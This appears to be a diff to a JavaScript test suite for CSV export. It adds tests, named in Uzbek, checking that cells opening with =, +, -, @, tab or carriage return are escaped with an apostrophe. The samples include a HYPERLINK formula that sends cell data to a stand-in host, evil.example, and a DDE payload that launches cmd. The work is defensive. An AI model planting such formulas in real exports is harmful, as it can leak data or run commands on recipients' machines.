@@ -39,6 +39,24 @@ test("csv: toCsv escape va round-trip", () => {
   assert.deepEqual(parsed[1], data[1]);
 });
 
+test("csv: formula bilan boshlangan hujayra matnga aylanadi", () => {
+  const dangerous = [
+    '=HYPERLINK("https://evil.example/?d="&A1,"bos")',
+    "+cmd|' /C calc'!A0",
+    "-2+3",
+    "@SUM(A1:A9)",
+    "\t=1+1",
+    "\r=1+1",
+  ];
+  const parsed = parseCsv(toCsv([dangerous]));
+  assert.deepEqual(parsed[0], dangerous.map((s) => `'${s}`));
+});
+
+test("csv: oddiy son va matn o'zgarmaydi", () => {
+  const safe = [-5, "-12.5", "+998901234567", "Aziza", "a=b", ""];
+  assert.equal(toCsv([safe]), '-5,-12.5,+998901234567,Aziza,a=b,');
+});
+
 test("slugify: kirill va apostroflar", () => {
   assert.equal(slugify("Aziza Karimova"), "aziza-karimova");
   assert.equal(slugify("O‘tkir G‘aniyev"), "otkir-ganiyev");
